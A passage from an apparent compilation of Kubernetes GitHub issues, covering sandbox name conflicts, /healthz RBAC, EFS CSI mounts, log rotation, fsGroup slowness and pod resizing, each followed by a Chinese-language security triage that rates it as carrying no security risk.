Aug 02 10:01:03 openEuler kubelet[1024]: E0802 10:01:03.693400    1024 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"CreatePodSandbox\" for \"etcd-openeuler_kube-system(ae0fcba533f9b951c6983487becf13f9)\" with CreatePodSandboxError: \"Failed to create sandbox for pod \\\"etcd-openeuler_kube-system(ae0fcba533f9b951c6983487becf13f9)\\\": rpc error: code = Unknown desc = Conflict. The name \\\"k8s_POD_etcd-openeuler_kube-system_ae0fcba533f9b951c6983487becf13f9_0\\\" is already in use by sandbox 30ed179087f03d03fef197363103427e48242829f815488bb774313db02c41a4. You have to remove that sandbox to be able to reuse that name.\"" pod="kube-system/etcd-openeuler" podUID="ae0fcba533f9b951c6983487becf13f9"
Aug 02 10:01:04 openEuler kubelet[1024]: E0802 10:01:04.276824    1024 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"KillPodSandbox\" for \"ae0fcba533f9b951c6983487becf13f9\" with KillPodSandboxError: \"rpc error: code = Unknown desc = You cannot stop container d5c60843291be7385fc0377c625582ccbc83715e6ae7614533cd21f7e313a50f in garbage collector progress.\"" pod="kube-system/etcd-openeuler" podUID="ae0fcba533f9b951c6983487becf13f9"
Aug 02 10:01:09 openEuler kubelet[1024]: E0802 10:01:09.888481    1024 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"KillPodSandbox\" for \"ae0fcba533f9b951c6983487becf13f9\" with KillPodSandboxError: \"rpc error: code = Unknown desc = You cannot stop container d5c60843291be7385fc0377c625582ccbc83715e6ae7614533cd21f7e313a50f in garbage collector progress.\"" pod="kube-system/etcd-openeuler" podUID="ae0fcba533f9b951c6983487becf13f9"
Aug 02 10:01:11 openEuler kubelet[1024]: E0802 10:01:11.199099    1024 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"KillPodSandbox\" for \"ae0fcba533f9b951c6983487becf13f9\" with KillPodSandboxError: \"rpc error: code = Unknown desc = You cannot stop container d5c60843291be7385fc0377c625582ccbc83715e6ae7614533cd21f7e313a50f in garbage collector progress.\"" pod="kube-system/etcd-openeuler" podUID="ae0fcba533f9b951c6983487becf13f9"
Aug 02 10:01:23 openEuler kubelet[1024]: E0802 10:01:23.335772    1024 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"KillPodSandbox\" for \"ae0fcba533f9b951c6983487becf13f9\" with KillPodSandboxError: \"rpc error: code = Unknown desc = You cannot stop container d5c60843291be7385fc0377c625582ccbc83715e6ae7614533cd21f7e313a50f in garbage collector progress.\"" pod="kube-system/etcd-openeuler" podUID="ae0fcba533f9b951c6983487becf13f9"

#### What did you expect to happen?

Once the above error is reported, the startup of etcd and apiserver will be delayed, and this bug will affect the startup speed of the business pod.

#### How can we reproduce it (as minimally and precisely as possible)?

After deploying `k8s v1.30.3`, turn on the `EventedPLEG` feature, power off and restart.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
k8s v1.30.3
</details>


#### Cloud provider

<details>
local
</details>


#### OS version

<details>
openeuler 22.03 LTS
arm64

Linux edgenode06 5.10.0 #7 SMP Sat Jun 10 13:37:24 CST 2023 aarch64 aarch64 aarch64 GNU/Linux

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
isulad v2.1.5
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，该问题发生在系统断电重启后，`kubelet`在启动`etcd`和`apiserver`时报告sandbox名称冲突的错误，导致启动延迟。这是由于异常关机后，容器运行时（`isulad`）未能正确清理此前的sandbox，导致名称冲突。

该问题是由于系统异常导致的资源清理不彻底，属于正常的错误处理范围内，没有提及任何可以被攻击者利用的漏洞或安全风险。攻击者无法通过此问题获得更高的权限，执行命令，或影响其他用户的容器。

根据风险判断标准，特别是第6条：“如果Issue不涉及安全问题，则风险评级判断为不涉及”，因此此Issue不涉及安全风险。

---

## Issue #126571 RBAC not work for /healthz

- Issue 链接：[#126571](https://github.com/kubernetes/kubernetes/issues/126571)

### Issue 内容

#### What happened?

ref https://kubernetes.io/docs/reference/using-api/health-checks/
```
$ curl -k https://localhost:6443/livez?verbose
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
$ curl -k https://localhost:6443/healthz
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

I see that the cluster has the following rules by default, but it does not actually take effect

```
$ kubectl get clusterrolebinding system:public-info-viewer -o yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  annotations:
    rbac.authorization.kubernetes.io/autoupdate: "true"
  creationTimestamp: "2024-07-25T09:45:24Z"
  labels:
    kubernetes.io/bootstrapping: rbac-defaults
  name: system:public-info-viewer
  resourceVersion: "136"
  uid: 6fa4a428-1d86-44cb-b81c-c034b43d0d7d
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: system:public-info-viewer
subjects:
- apiGroup: rbac.authorization.k8s.io
  kind: Group
  name: system:authenticated
- apiGroup: rbac.authorization.k8s.io
  kind: Group
  name: system:unauthenticated
```

clusterrole
```
$ kubectl get clusterrole system:public-info-viewer -o yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  annotations:
    rbac.authorization.kubernetes.io/autoupdate: "true"
  creationTimestamp: "2024-07-25T09:45:23Z"
  labels:
    kubernetes.io/bootstrapping: rbac-defaults
  name: system:public-info-viewer
  resourceVersion: "74"
  uid: 464a60de-a111-4387-966a-9e094c08747f
rules:
- nonResourceURLs:
  - /healthz
  - /livez
  - /readyz
  - /version
  - /version/
  verbs:
  - get

```

#### What did you expect to happen?

return "ok"

#### How can we reproduce it (as minimally and precisely as possible)?

install by bin file + systemd service


#### Anything else we need to know?

cmdline:
```
kube-apiserver \
  --enable-admission-plugins=NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,ResourceQuota,NodeRestriction,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,DefaultTolerationSeconds \
  --default-not-ready-toleration-seconds=300 \
  --default-unreachable-toleration-seconds=10 \
  --bind-address=0.0.0.0 \
  --authorization-mode=Node,RBAC \
  --kubelet-client-certificate=/etc/kubernetes/cluster1/ssl/kubernetes.pem \
  --kubelet-client-key=/etc/kubernetes/cluster1/ssl/kubernetes-key.pem \
  --anonymous-auth=false \
  --service-cluster-ip-range=10.186.0.0/16 \
  --service-node-port-range=20000-40000 \
  --tls-cert-file=/etc/kubernetes/cluster1/ssl/kubernetes.pem \
  --tls-private-key-file=/etc/kubernetes/cluster1/ssl/kubernetes-key.pem \
  --client-ca-file=/etc/kubernetes/cluster1/ssl/ca.pem \
  --service-account-issuer=https://kubernetes.default.svc \
  --service-account-signing-key-file=/etc/kubernetes/cluster1/ssl/ca-key.pem \
  --service-account-key-file=/etc/kubernetes/cluster1/ssl/ca.pem \
  --etcd-cafile=/etc/kubernetes/cluster1/ssl/ca.pem \
  --etcd-certfile=/etc/kubernetes/cluster1/ssl/kubernetes.pem \
  --etcd-keyfile=/etc/kubernetes/cluster1/ssl/kubernetes-key.pem \
  --etcd-servers=https://10.xxx.xx.xxx:2379 \
  --endpoint-reconciler-type=lease \
  --allow-privileged=true \
  --requestheader-client-ca-file=/etc/kubernetes/cluster1/ssl/ca.pem \
  --requestheader-allowed-names= \
  --requestheader-extra-headers-prefix=X-Remote-Extra- \
  --requestheader-group-headers=X-Remote-Group \
  --requestheader-username-headers=X-Remote-User \
  --proxy-client-cert-file=/etc/kubernetes/cluster1/ssl/aggregator-proxy.pem \
  --proxy-client-key-file=/etc/kubernetes/cluster1/ssl/aggregator-proxy-key.pem \
  --enable-aggregator-routing=true \
  --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_256_GCM_SHA384 \
  --v=2
```

I found that it seems that the cluster deployed by `kubeadm` can return ok

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.15", GitCommit:"fb63712e1d017142977e88a23644b8e48b775665", GitTreeState:"clean", BuildDate:"2024-06-11T20:04:38Z", GoVersion:"go1.21.11", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v5.0.1
Server Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.15", GitCommit:"fb63712e1d017142977e88a23644b8e48b775665", GitTreeState:"clean", BuildDate:"2024-06-11T19:56:02Z", GoVersion:"go1.21.11", Compiler:"gc", Platform:"linux/amd64"}

```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

bin file and systemd

#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了未认证用户无法访问`/healthz`接口的问题。根据提供的信息，尽管ClusterRole和ClusterRoleBinding已经配置允许未认证用户访问`/healthz`，但实际请求仍然返回了`401 Unauthorized`错误。

从安全角度来看，`/healthz`接口通常用于健康检查，允许未认证用户访问并不会带来安全风险。相反，当前的情况是未认证用户无法访问`/healthz`，这可能会影响负载均衡器或监控系统对集群健康状态的检测，但这属于功能性问题而非安全问题。

根据风险判断标准：

1. **该风险能被攻击者利用**：不存在可被攻击者利用的风险。
2. **可能成为漏洞并被分配CVE编号，且CVSS评分在high以上**：不符合。
6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**：符合。

因此，该Issue不涉及安全风险。

---

## Issue #126569 PVC Mounts fails when STAGE_UNSTAGE_VOLUME check fails for k8s EFS CSI

- Issue 链接：[#126569](https://github.com/kubernetes/kubernetes/issues/126569)

### Issue 内容

#### What happened?

PVC Mount fails for CronJob 
Kubelet fails to check for `STAGE_UNSTAGE_VOLUME` capability

#### What did you expect to happen?

I expected that in retries PVC should get mounted


#### How can we reproduce it (as minimally and precisely as possible)?

We've been seeing this issue intermittently but we can follow steps mentioned over https://github.com/kubernetes/kubernetes/issues/112969#issuecomment-1276871605 to reproduce the issue

#### Anything else we need to know?

Relatively similar issue of what's over here https://github.com/kubernetes/kubernetes/issues/112969


Below are the k8s event from our k8s cluster

```console
Events:
  Type     Reason       Age                    From     Message
  ----     ------       ----                   ----     -------
  Warning  FailedMount  41m (x12 over 154m)    kubelet  Unable to attach or mount volumes: unmounted volumes=[dummy-volume], unattached volumes=[kube-api-access-abcde dummy-volume]: timed out waiting for the condition
  Warning  FailedMount  37m (x26 over 167m)    kubelet  MountVolume.SetUp failed for volume "pvc-a1b34545-123a-321a-123b-12345a6b789c" : rpc error: code = Unavailable desc = error reading from server: EOF
  Warning  FailedMount  32m (x10 over 145m)    kubelet  Unable to attach or mount volumes: unmounted volumes=[dummy-volume-a desiree-data-global], unattached volumes=[dummy-volume-a kube-api-access-abcde desiree-data-global]: timed out waiting for the condition
  Warning  FailedMount  26m (x48 over 167m)    kubelet  MountVolume.SetUp failed for volume "pvc-a1b34545-123a-321a-123b-12345a6b789c" : kubernetes.io/csi: mounter.SetUpAt failed to check for STAGE_UNSTAGE_VOLUME capability: rpc error: code = Unavailable desc = connection error: desc = "transport: Error while dialing: dial unix /var/lib/kubelet/plugins/efs.csi.aws.com/csi.sock: connect: connection refused"
  Warning  FailedMount  22m (x49 over 167m)    kubelet  MountVolume.SetUp failed for volume "pvc-k1l34545-123s-321g-123h-12345a6b789d" : kubernetes.io/csi: mounter.SetUpAt failed to check for STAGE_UNSTAGE_VOLUME capability: rpc error: code = Unavailable desc = connection error: desc = "transport: Error while dialing: dial unix /var/lib/kubelet/plugins/efs.csi.aws.com/csi.sock: connect: connection refused"
  Warning  FailedMount  12m (x30 over 167m)    kubelet  MountVolume.SetUp failed for volume "pvc-k1l34545-123s-321g-123h-12345a6b789d" : rpc error: code = Unavailable desc = error reading from server: EOF
  Warning  FailedMount  2m51s (x45 over 166m)  kubelet  Unable to attach or mount volumes: unmounted volumes=[dummy-volume], unattached volumes=[dummy-volume kube-api-access-abcde]: timed out waiting for the condition
  ```



#### Kubernetes version

<details>

```console
Client Version: version.Info{Major:"1", Minor:"25", GitVersion:"v1.25.0", GitCommit:"a866cbe2e5bbaa01cfd5e969aa3e033f3282a8a2", GitTreeState:"clean", BuildDate:"2022-08-23T17:44:59Z", GoVersion:"go1.19", Compiler:"gc", Platform:"darwin/amd64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"25", GitVersion:"v1.25.16", GitCommit:"c5f43560a4f98f2af3743a59299fb79f07924373", GitTreeState:"clean", BuildDate:"2023-11-15T22:28:05Z", GoVersion:"go1.20.10", Compiler:"gc", Platform:"linux/arm64"}
```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

N/A

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
CSI
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，用户在使用AWS EFS CSI驱动时，遇到了PVC（PersistentVolumeClaim）挂载失败的问题。具体表现为Kubelet在检查`STAGE_UNSTAGE_VOLUME`能力时失败，无法正常挂载PVC，出现了多次重试仍无法挂载的情况。

从安全风险的角度分析，这个问题主要是由于Kubelet与CSI驱动之间的通信错误或CSI插件未正常运行导致的资源不可用问题，属于系统稳定性和可用性方面的问题。

根据风险判断标准：

1. 攻击者无法利用该问题获取更高权限或执行未授权的操作。
2. 该问题不会导致系统存在可被分配CVE编号的漏洞，且根据CVSS 3.1评分标准，风险等级不会达到高风险级别。
6. 如果Issue不涉及安全问题，则风险评级判断为不涉及。

因此，该Issue不涉及安全风险。

---

## Issue #126564 kubectl logs -f stop after log rotation

- Issue 链接：[#126564](https://github.com/kubernetes/kubernetes/issues/126564)

### Issue 内容

#### What happened?

I have a problem that kubectl logs -f stop after log file rotation. 
https://github.com/kubernetes/kubernetes/pull/115702
In this link said this problem solved but when I update my kuber version to 1.29.0, I have this problem yet.

#### What did you expect to happen?

`kubectl logs -f` continue showing logs after log rotation.

#### How can we reproduce it (as minimally and precisely as possible)?

I have create this pod:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: counter
spec:
  containers:
  - args:
    - /bin/sh
    - -c
    - 'i=0; while true; do echo "$i: $(date)"; i=$((i+1)); sleep 0.1; done'
    image: busybox:1.28
    imagePullPolicy: IfNotPresent
    name: count
```

Then I use this command to check logs:
```
k logs -f counter
```

After rotation `k logs -f counter` stop showing logs. When I check time of last log find this is as same as time of rotation of log file ( after 10M)

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.29.0

#### Cloud provider

<details>
on-premise
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
calico
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了使用`kubectl logs -f`跟踪Pod日志时，当日志文件发生轮转后，日志跟踪会停止的问题。这是一个功能性缺陷，影响了日志的连续性。但是，此问题并不存在被攻击者利用的安全风险，不会导致系统被攻击或产生高危漏洞。根据风险判断标准第6条，此Issue不涉及安全问题，因此风险评级判断为不涉及。

---

## Issue #126552 Slow FSGroup recursive permission changes cause customer confusion

- Issue 链接：[#126552](https://github.com/kubernetes/kubernetes/issues/126552)

### Issue 内容

#### What happened?

[FSGroup volume permission setting](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#configure-volume-permission-and-ownership-change-policy-for-pods) is very useful for making NFS volumes just work in spite of the impedance between containers and traditional user id based linux file permissions. 

However, in practice with large volumes, fsgroup settings can cause workloads to effectively get stuck, as it can take hours or days to recursively change permissions on multi-terabyte servers. The fsGroupChangePolicy has helped that (onRootMismatch is a win), but this has still been a perennial source of customer issues.

The [kubelet does log when a long fsgroup change is in progress](https://github.com/kubernetes/kubernetes/blob/master/pkg/volume/volume_linux.go#L49), but this does not provide enough actionable information.


#### What did you expect to happen?


The kubelet logging could be extended to provide updates of long-running fsgroup recursion, and maybe even some kind of progress (eg, some estimates of how much of the file tree has been walked).

#### How can we reproduce it (as minimally and precisely as possible)?

Reproduction requires a large volume with many files, but it can be done with any volume type, eg RWO.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
All versions
</details>


#### Cloud provider

<details>
We've seen customer complaints on GKE, but I imagine it happens on all providers.
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue讨论了在Kubernetes中使用FSGroup进行卷的权限更改时，当卷包含大量文件时，递归更改权限可能需要耗费数小时甚至数天，导致工作负载被卡住。Issue建议改进kubelet的日志记录，以提供长时间运行的fsgroup递归操作的更新和进度估计。这属于性能和用户体验方面的问题，不涉及任何安全风险。根据风险判断标准，此Issue不涉及安全问题。

---

## Issue #126547 duplicate init kube-apiserver gorestful.container.ServeMux

- Issue 链接：[#126547](https://github.com/kubernetes/kubernetes/issues/126547)

### Issue 内容

#### What happened?

https://github.com/kubernetes/kubernetes/blob/00236ae0d73d2455a2470469ed1005674f8ed61f/staging/src/k8s.io/apiserver/pkg/server/handler.go#L80
https://github.com/emicklei/go-restful/blob/33de94869dbe48c2ad3bba44083546d0672fc359/container.go#L39

#### What did you expect to happen?

whether should init gorestful.container.ServeMux once

#### How can we reproduce it (as minimally and precisely as possible)?

none

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
通过分析该Issue内容，可以看出，提交者指出了在kube-apiserver中重复初始化了`gorestful.container.ServeMux`，提出是否应该只初始化一次。

重复初始化`ServeMux`可能会导致程序的异常行为，例如路由冲突、覆盖等。但从当前提供的信息来看，没有具体指出这种重复初始化会导致任何可被攻击者利用的安全漏洞。

根据风险判断标准：

1. 该风险是否能被攻击者利用？目前并没有证据表明攻击者可以利用此问题。
2. 该风险是否有可能成为一个漏洞，并被分配CVE编号，且CVSS评分在高风险以上？根据现有信息，无法判断此问题会导致高风险漏洞。

因此，基于目前的信息，该Issue不涉及安全风险。

---

## Issue #126546 Impossible to notice without major delay when a container exits while the POD is in terminating state

- Issue 链接：[#126546](https://github.com/kubernetes/kubernetes/issues/126546)

### Issue 内容

#### What happened?

When a POD which is part of a service starts graceful termination, and the main container exits the related endpoint in endpointslice does not go to serving=false. Only after readiness probe fails will the endpoint enter serving=false state. Which doesn't make sense in my opinion.

I also tried watching for POD changes and determine that the container exited based on container_statuses list. But there I hit this issue: https://github.com/kubernetes/kubernetes/issues/106896

Then I tried to remove the label which selects the POD as an endpoint by the service, but then I experienced ~5s delay till kubernetes notified that the endpoint has disappeared.

#### What did you expect to happen?

The endpoint should go to serving=false when any container exits in a POD which is under graceful termination.
Also the alternatives I tried should have worked I think.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a POD with 2 containers, 1 which exits immediately after receiving SIGTRERM, the other doesn't so it is killed by SIGKILL after termination grace period. The first container should also have a readiness probe which doesn't fail quick. ex.: period 5s, failureThreshold 3. Make the POD be part of a service. Delete the pod. Check the endpoint in the endpointslice only going to serving=false, after the readiness probe fails. 

#### Anything else we need to know?

_No response_

#### Kubernetes version

kubectl version
Client Version: v1.28.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.1

#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Pod终止过程中，当其中一个容器退出时，endpointslice没有立即更新endpoint的serving状态，只有在readiness probe失败后，endpoint才进入serving=false状态。这可能导致在Pod终止期间，服务仍然将流量路由到已退出的容器，可能引起短暂的服务不可用。

根据风险判断标准：
1. 该风险能被攻击者利用？此问题需要攻击者能够触发Pod的删除或终止，以及控制容器的退出行为，这通常需要具备相应的权限。
4. 当漏洞利用需要攻击者具备创建、修改等非只读权限时，不应判断为高风险，CVSS评级在high以下。
6. 如果Issue不涉及安全问题，则风险评级判断为不涉及。

综上所述，此Issue涉及的是Kubernetes在Pod终止过程中的状态更新延迟问题，属于功能性或可靠性问题，并不涉及安全风险。

---

## Issue #126531 Inconsistency between the code and the doc on how `matchFields` works

- Issue 链接：[#126531](https://github.com/kubernetes/kubernetes/issues/126531)

### Issue 内容

#### What happened?

The `pod.spec.affinity.nodeAffinity.requiredDuringSchedulingIgnoredDuringExecution.nodeSelectorTerms.matchFields` is introduced in PR [#62202](https://github.com/kubernetes/kubernetes/pull/62002) and used to bind a pod directly to nodes via `metadata.name`. However, we find that there are some hidden constraints on how to use this field that are not documented well.

More concretely, the current API documentation says that
```
> kubectl explain pod.spec.affinity.nodeAffinity.requiredDuringSchedulingIgnoredDuringExecution.nodeSelectorTerms.matchFields
    KIND:       Pod
    VERSION:    v1

    FIELD: matchFields <[]NodeSelectorRequirement>


    DESCRIPTION:
        A list of node selector requirements by node's fields.
        A node selector requirement is a selector that contains values, a key, and
        an operator that relates the key and values.
    
    FIELDS:
      key   <string> -required-
        The label key that the selector applies to.
    
      operator      <string> -required-
      enum: DoesNotExist, Exists, Gt, In, ....
        Represents a key's relationship to a set of values. Valid operators are In,
        NotIn, Exists, DoesNotExist. Gt, and Lt.
    
        Possible enum values:
         - `"DoesNotExist"`
         - `"Exists"`
         - `"Gt"`
         - `"In"`
         - `"Lt"`
         - `"NotIn"`
    
      values        <[]string>
        An array of string values. If the operator is In or NotIn, the values array
        must be non-empty. If the operator is Exists or DoesNotExist, the values
        array must be empty. If the operator is Gt or Lt, the values array must have
        a single element, which will be interpreted as an integer. This array is
        replaced during a strategic merge patch.
```
And the doc does not mention that its key must be `metadata.name`, it's operator must be in `In/NotIn`, and the number of its value<s>s</s> must be equal to 1 (thought the term itself can be defined multiple times in `nodeSelectorTerms`).


This issue has also caused confusion in [#115980](https://github.com/kubernetes/kubernetes/issues/115980), [#81725](https://github.com/kubernetes/kubernetes/issues/81725), [#78238](https://github.com/kubernetes/kubernetes/issues/78238) and a reddit [thread](https://stackoverflow.com/questions/67018171/kubernetes-what-are-valid-node-fields)


#### What did you expect to happen?

The hidden constraints should be explicitly documented if they reflect the developers' real intent. For example, we can mention this field in kubernetes.io docs, and clarify in the API doc on the constraints.

Besides improving the doc, we are thinking about how to prevent misconfiguration in this field (e.g., someone specifies things other than node name in `matchFields`) in the first place. One direction is to make the API more restrictive rather than take in any valid strings.


#### How can we reproduce it (as minimally and precisely as possible)?

Read the documentation and the code.

#### Anything else we need to know?

/sig scheduling docs

#### Kubernetes version

<details>

Since 1.11, exists in 1.30

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，讨论的是`matchFields`字段在文档和代码中的不一致性，以及该字段使用时的隐藏约束没有明确记录。这可能会导致用户在配置Pod的NodeAffinity时出现困惑或误用。然而，这并不涉及安全风险，也没有提及任何可能被攻击者利用的漏洞。因此，按照风险判断标准第6条，该Issue不涉及安全问题。

---

## Issue #126527 [FG:InPlacePodVerticalScaling] Handle pod resize even if the pod has not started yet

- Issue 链接：[#126527](https://github.com/kubernetes/kubernetes/issues/126527)

### Issue 内容

#### What happened?

If an unacceptable pod resizing that causes `Deferred` or `Infeasible` is requested before the container is started (for example, while an init container is running), the container is started with the unacceptable spec.

```
$ kubectl create -f pod.yaml; sleep 5; kubectl patch pod resize-pod --patch '{"spec": {"containers": [{"name": "resize-container", "resources":{"requests": {"cpu": "100"}, "limits": {"cpu": "100"}}}]}}'
pod/resize-pod created
pod/resize-pod patched
$ kubectl get pod resize-pod -o jsonpath='spec: {.spec.containers[0].resources}{"\nallocatedResources: "}{.status.containerStatuses[0].allocatedResources}{"\nstatus: "}{.status.containerStatuses[0].resources}{"\nresize: "}{.status.resize}{"\n"}'
spec: {"limits":{"cpu":"100","memory":"200Mi"},"requests":{"cpu":"100","memory":"200Mi"}}
allocatedResources: {"cpu":"200m","memory":"200Mi"}
status: {"limits":{"cpu":"100","memory":"200Mi"},"requests":{"cpu":"100","memory":"200Mi"}}
resize: Infeasible
```


The pod is admitted with the initial spec when the pod is created. Then, the resized spec is not verified for admission because the pod is not running yet:
https://github.com/kubernetes/kubernetes/blob/dbc2b0a5c7acc349ea71a14e49913661eaf708d2/pkg/kubelet/kubelet.go#L2811-L2814
As a result, the container is started with the unacceptable spec. Eventually, the pod gets into `Infeasible` resize status after the pod is started because the allocated resources that are not updated differs from the resized pod spec.

It does not seems that this issue affects actual resource consumption similarly to #126033. Because the pod cgroup is not updated in this case, the container resource will keep limited. In addition, since `AllocatedResources` in the container is not updated, this infeasible resizing will not affect the pod resource calculation of the scheduler.

#### What did you expect to happen?

The pod is started with the initial spec and gets into `Infeasible` resize status or the pod fails to start.


#### How can we reproduce it (as minimally and precisely as possible)?

0. Enable `InPlacePodVerticalScaling`.
1. Create a pod with an init container that takes a few seconds to complete:
    <Details>

   ```
   apiVersion: v1
   kind: Pod
   metadata:
     creationTimestamp: null
     labels:
       run: resize-pod
     name: resize-pod
   spec:
     initContainers:
     - image: busybox
       name: init-container
       command:
         - sleep
         - "10"
       resources:
         requests:
           cpu: 100m
           memory: 100Mi
         limits:
           cpu: 100m
           memory: 100Mi
     containers:
     - image: busybox
       name: resize-container
       command:
         - sh
         - -c
         - trap "exit 0" SIGTERM; while true; do sleep 1; done
       resources:
         requests:
           cpu: 200m
           memory: 200Mi
         limits:
           cpu: 200m
           memory: 200Mi
       resizePolicy:
       - resourceName: cpu
         restartPolicy: NotRequired
       - resourceName: memory
         restartPolicy: NotRequired
     restartPolicy: Always
   ```

   </Details>
2. While the init container is running, patch the pod with an infeasible resize request:
   ```
   $ kubectl create -f pod.yaml; sleep 5; kubectl patch pod resize-pod --patch '{"spec": {"containers": [{"name": "resize-container", "resources":{"requests": {"cpu": "100"}, "limits": {"cpu": "100"}}}]}}'
   ```
3. Watch the pod:
   ```
   $ kubectl get pod resize-pod -o jsonpath='spec: {.spec.containers[0].resources}{"\nallocatedResources: "}{.status.containerStatuses[0].allocatedResources}{"\nstatus: "}{.status.containerStatuses[0].resources}{"\nresize: "}{.status.resize}{"\n"}' -w
   ```


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.2
```

</details>


#### Cloud provider

N/A


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用InPlacePodVerticalScaling功能时，如果在容器启动前请求了一个不可接受的Pod资源调整（导致`Deferred`或`Infeasible`状态），容器会以不可接受的规格启动。然而，根据Issue内容，该问题并不会影响实际的资源消耗，因为Pod的cgroup没有被更新，容器资源仍然受限。此外，容器的`AllocatedResources`未被更新，这种不可行的调整也不会影响调度器对Pod资源的计算。因此，该问题并不导致资源泄露、权限提升、命令执行等安全风险，只是一个功能性缺陷，属于正常的Bug范畴。根据风险判断标准6，如果Issue不涉及安全问题，则风险评级判断为不涉及。

---

## Issue #126630 Cannot set kubelet config `resolvConf` with drop-in config files

- Issue 链接：[#126630](https://github.com/kubernetes/kubernetes/issues/126630)

### Issue 内容

#### What happened?

